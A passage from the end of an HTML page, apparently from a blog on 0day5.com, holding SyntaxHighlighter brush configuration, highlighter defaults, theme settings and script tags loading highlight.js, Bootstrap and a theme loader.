                        'java                  http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushJava.js',
                        'jfx javafx            http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushJavaFX.js',
                        'js jscript javascript http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushJScript.js',
                        'perl pl               http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushPerl.js',
                        'php                   http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushPhp.js',
                        'text plain            http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushPlain.js',
                        'powershell ps         http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushPowerShell.js',
                        'py python             http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushPython.js',
                        'ruby rails ror rb     http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushRuby.js',
                        'sass scss             http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushSass.js',
                        'scala                 http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushScala.js',
                        'sql                   http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushSql.js',
                        'vb vbnet              http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushVb.js',
                        'xml xhtml xslt html   http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushXml.js'
                        );
                SyntaxHighlighter.defaults['auto-links'] = true;
                SyntaxHighlighter.defaults['collapse'] = false;
                SyntaxHighlighter.defaults['gutter'] = false;
                SyntaxHighlighter.defaults['smart-tabs'] = false;
                SyntaxHighlighter.defaults['tab-size'] = 4;
                SyntaxHighlighter.defaults['toolbar'] = false;
                SyntaxHighlighter.all();
            }
        </script>
    <script src="//cdn.jsdelivr.net/highlight.js/9.11.0/highlight.min.js"></script>
    <script>
        window.jsui={
            www: 'http://0day5.com/',
            uri: 'http://0day5.com/usr/themes/DUX',
            ver: '1.0',
            roll: ["1",],
            ajaxpager: '0'
        };
    </script>
    <script type='text/javascript' src='//cdn.jsdelivr.net/bootstrap/3.2.0/js/bootstrap.min.js'></script>
    <script type='text/javascript' src='http://0day5.com/usr/themes/DUX/js/loader.js'></script>
    <!-- Analytics code -->

</body>
</html>
